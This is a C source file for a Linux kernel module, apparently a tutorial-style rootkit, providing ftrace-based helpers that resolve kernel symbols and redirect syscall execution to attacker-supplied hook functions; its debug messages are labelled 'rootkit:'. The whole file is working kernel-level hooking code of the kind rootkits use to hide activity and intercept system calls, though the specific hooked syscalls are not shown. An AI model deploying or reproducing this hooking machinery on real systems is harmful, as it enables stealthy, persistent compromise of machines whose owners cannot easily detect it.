#include <linux/ftrace.h>
#include <linux/module.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

/* In 64-bit kernel versions 4.17.0+, the manner of syscalls changed */
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
#define SYSCALL_NAME(name) ("__x64_" name)
#else
#define SYSCALL_NAME(name) (name)
#endif

#define HOOK(_name, _hook, _orig)     \
{                                     \
	.name = SYSCALL_NAME(_name),  \
	.function = (_hook),          \
	.original = (_orig),          \
}

/* We need to prevent recursive loops.
 * Set USE_FENTRY_OFFSET = 0, 
 * to detect recursion by looking at the function return address.
 * Otherwise, by jumping over the ftrace call.
 * (Oridinarily ftrace provides it's own protections against recursion,
 * but it relies on saving return registers in $rip.
 * We need the use of the $rip register in our hook,
 * so we have to disable this protection and implement our own).
 */
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

/* We pack all we need into this struct.
 * This makes is easier for setting up the hook
 * and just passing the entire struct off to fh_install_hook() later on.
 */
struct ftrace_hook {
	const char *name;
	void *function;
	void *original;

	unsigned long address;
	struct ftrace_ops ops;
};

/* Ftrece needs to know the address of the original function that we
 * are going to hook. As before, we just use kallsysm_lookup_name()
 * to find the address in kernel memory.
 */
static int fh_resolve_hook_address(struct ftrace_hook *hook) {
	hook->address = kallsyms_lookup_name(hook->name);

	if (!hook->address) {
		printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}

// detect recursion by 
#if USE_FENTRY_OFFSET // 1: jumping over the ftrace call
	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else                 // 0: looking at the function return address
	*((unsigned long*) hook->original) = hook->address;
#endif

	return 0;
}

/* See comment below within fh_install_hook() 
 * thunk: 传名调用函数
 */
static void notrace fh_ftrace_thunk(unsigned long ip, 
unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs) {
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
	regs->ip = (unsigned long) hook->function;
#else
	if(!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long) hook->function;
#endif
}

/* Assuming we've already set hook->name, hook->function and hook->original,
 * we can go ahead and install the hook with ftrace. This is done by setting
 * the ops field of hook, and then using the built-in ftrace_set_filter_ip()
 * and register_ftrace_function() functions provided by ftrace.h.
 */
int fh_install_hook(struct ftrace_hook *hook) {
	int err;
	err = fh_resolve_hook_address(hook);
	if (err)
		return err;

	/* For many of function hooks, the $rip gets modified, so we have to
	 * alert ftrace to this fact. This is the reason for the SAVE_REGS
	 * and IP_MODIFY flags. However, we also need to OR the RECURSION_SAFE
	 * flag because the built-in anti-recursion guard provided by ftrace
	 * is useless if we're modifying $rip.
	 */
	hook->ops.func = fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
		| FTRACE_OPS_FL_RECURSION_SAFE
		| FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if (err) {
		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if (err) {
		printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
		return err;
	}

	return 0;
}

/* Disable hook is easier that just use build-in function
 * unregister_ftrace_function() and frace_set_filter_ip()
 */
void fh_remove_hook(struct ftrace_hook *hook) {
	int err;
	err = unregister_ftrace_function(&hook->ops);
	if (err)
		printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if (err)
		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
}

int fh_install_hooks(struct ftrace_hook *hooks, size_t count) {
	int err;
	size_t i;

	for ( i = 0; i < count; i += 1 ) {
		err = fh_install_hook(&hooks[i]);
		if (err)
			goto error;
	}
	return 0;

error:
	while ( i != 0 )
		fh_remove_hook(&hooks[--i]);
	return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) {
	size_t i;

	for ( i = 0; i < count ; i += 1 )
		fh_remove_hook(&hooks[i]);
}

